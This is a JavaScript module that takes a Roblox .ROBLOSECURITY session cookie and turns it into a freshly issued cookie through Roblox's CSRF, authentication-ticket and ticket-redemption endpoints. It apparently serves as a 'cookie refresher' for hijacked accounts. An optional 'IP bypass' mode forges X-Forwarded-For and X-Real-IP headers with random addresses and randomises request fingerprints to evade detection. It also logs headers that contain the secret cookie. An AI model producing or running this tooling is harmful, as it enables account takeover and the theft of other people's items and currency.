
import axios from 'axios';

async function fetchSessionCSRFToken(roblosecurityCookie, useIPBypass = false) {
    // Define headers outside the try/catch block so it's available in both blocks
    const headers = {
        'Cookie': `.ROBLOSECURITY=${roblosecurityCookie}`
    };
    
    // Add IP bypass headers if needed
    if (useIPBypass) {
        const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        headers['X-Forwarded-For'] = randomIp;
        headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
        headers['Cache-Control'] = 'no-cache';
        headers['Accept-Language'] = 'en-US,en;q=0.9';
    }
    
    try {
        console.log("Attempting to get CSRF token for cookie");
        await axios.post("https://auth.roblox.com/v2/logout", {}, { headers });

        console.log("Warning: Logout request succeeded when it should have failed to get CSRF token");
        return null;
    } catch (error) {
        const csrfToken = error.response?.headers["x-csrf-token"];
        console.log("CSRF token obtained:", csrfToken ? "Yes" : "No");
        console.log("Using headers for CSRF:", JSON.stringify(headers));
        
        if (!csrfToken) {
            console.log("Failed to get CSRF token. Response status:", error.response?.status);
            console.log("Response headers:", JSON.stringify(error.response?.headers || {}));
        }
        
        return csrfToken || null;
    }
}

async function generateAuthTicket(roblosecurityCookie, useIPBypass = false) {
    try {
        console.log(`Generating auth ticket - getting CSRF token...${useIPBypass ? ' (using IP bypass)' : ''}`);
        const csrfToken = await fetchSessionCSRFToken(roblosecurityCookie, useIPBypass);
        console.log("CSRF token obtained:", csrfToken ? "Yes" : "No");
        
        // Set up custom headers to simulate a different client/IP
        const headers = {
            "x-csrf-token": csrfToken,
            "referer": "https://www.roblox.com",
            'Content-Type': 'application/json',
            'Cookie': `.ROBLOSECURITY=${roblosecurityCookie}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        };
        
        if (useIPBypass) {
            // Add randomized headers to appear as a different client
            const randomClientId = Math.random().toString(36).substring(2, 15);
            headers['Accept-Language'] = `en-US,en;q=${Math.random().toFixed(1)}`;
            headers['Cache-Control'] = 'no-cache';
            headers['Pragma'] = `no-cache-${randomClientId}`;
            
            // Add forwarded headers to simulate requests through a proxy
            const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
            headers['X-Forwarded-For'] = randomIp;
            headers['X-Real-IP'] = randomIp;
            
            // Random client connection behavior
            if (Math.random() > 0.5) {
                headers['Connection'] = 'keep-alive';
            } else {
                headers['Connection'] = 'close';
            }
            
            // Random viewport size to simulate different devices
            const width = 800 + Math.floor(Math.random() * 1000);
            const height = 600 + Math.floor(Math.random() * 800);
            headers['Viewport-Width'] = width.toString();
            
            console.log(`IP bypass active with fingerprint: ${randomClientId}, IP: ${randomIp}`);
            console.log("Full IP bypass headers:", JSON.stringify(headers));
            
            // Add a random delay to simulate network variance
            await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 1000) + 500));
        }
        
        // First verify if the current cookie is valid
        console.log("Verifying cookie validity...");
        try {
            const authResponse = await axios.get('https://users.roblox.com/v1/users/authenticated', {
                headers: { 'Cookie': `.ROBLOSECURITY=${roblosecurityCookie}`, ...headers }
            });
            console.log("Cookie validation successful - user ID:", authResponse.data?.id);
        } catch (error) {
            console.log("Cookie validation failed:", error.response?.status);
            if (error.response?.status === 401) {
                console.log("Current cookie is expired");
                throw new Error("Current cookie is expired");
            }
        }

        console.log("Requesting authentication ticket...");
        const response = await axios.post("https://auth.roblox.com/v1/authentication-ticket", {}, {
            headers
        });

        const ticket = response.headers['rbx-authentication-ticket'];
        console.log("Auth ticket received:", ticket ? "Yes" : "No");
        return ticket || "Failed to fetch auth ticket";
    } catch (error) {
        console.error("Error in generateAuthTicket:", error.message);
        if (error.message === "Current cookie is expired") {
            return "EXPIRED";
        }
        return "Failed to fetch auth ticket";
    }
}

async function redeemAuthTicket(authTicket) {
    try {
        console.log("Starting to redeem auth ticket...");
        // Cookie redemption
        const response = await axios.post("https://auth.roblox.com/v1/authentication-ticket/redeem", {
            "authenticationTicket": authTicket
        }, {
            headers: {
                'RBXAuthenticationNegotiation': '1'
            }
        });

        console.log("Redemption response received");
        const refreshedCookieData = response.headers['set-cookie']?.toString() || "";
        console.log("Cookie headers:", refreshedCookieData ? "Found cookie headers" : "No cookie headers found");
        
        const newCookie = refreshedCookieData.match(/(_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_[A-Za-z0-9]+)/g)?.toString();
        
        if (!newCookie) {
            console.log("Failed to extract cookie from headers");
            return {
                success: false,
                error: "Failed to get cookie"
            };
        }
        
        console.log("Cookie extracted successfully");
        
        return {
            success: true,
            refreshedCookie: newCookie
        };
    } catch (error) {
        console.error("Error in redeemAuthTicket:", error.message);
        console.error("Error details:", error.response?.status, error.response?.statusText);
        return {
            success: false,
            error: error.message,
            robloxDebugResponse: error.response?.data
        };
    }
}

export {
    generateAuthTicket,
    redeemAuthTicket,
    fetchSessionCSRFToken
};
